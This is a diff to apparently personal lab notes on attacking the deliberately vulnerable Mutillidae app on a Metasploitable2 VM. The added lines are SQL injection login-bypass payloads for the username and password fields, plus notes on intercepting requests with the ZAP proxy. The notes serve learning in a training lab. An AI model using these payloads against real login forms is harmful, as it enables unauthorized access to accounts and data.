@@ -177,13 +177,18 @@ if __name__ == "__main__":
     print("\n".join(unsuccessful))
 ```
 
-### 2.2 Exploit MetaSpoitable2 VM
+### 2.2 Exploit [MetaSpoitable2](http://192.168.8.164/mutillidae/index.php?page=login.php) VM
 
 #### 2.2.1 Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields
 
 - MySQL Payload
 
 ```sql
+'
+test' or 1=1 #
+-- In username field only
+khader' #
+-- In password field only with any username
 ' OR 1=1 #
 ```
 
@@ -192,8 +197,19 @@ if __name__ == "__main__":
 - MySQL Payload
 
 ```sql
-' OR 1=1 #
+-- khader => should be edited in Zap
+khader' #
+-- kk
 ```
+
+> Notes related to Zap Proxy
+>
+> > - Zap Configs in the Browser
+> > - FoxyProxy Proxy Switcher
+> > - Connect to Zap Proxy with Burp Suite
+> > - Zap Spider and Crawler
+> > - Zap Scanner
+> > - Zap Breakpoints
 
 #### 2.2.3 Security Level 2 => (Advanced Protection) ==> Show the secure code
 
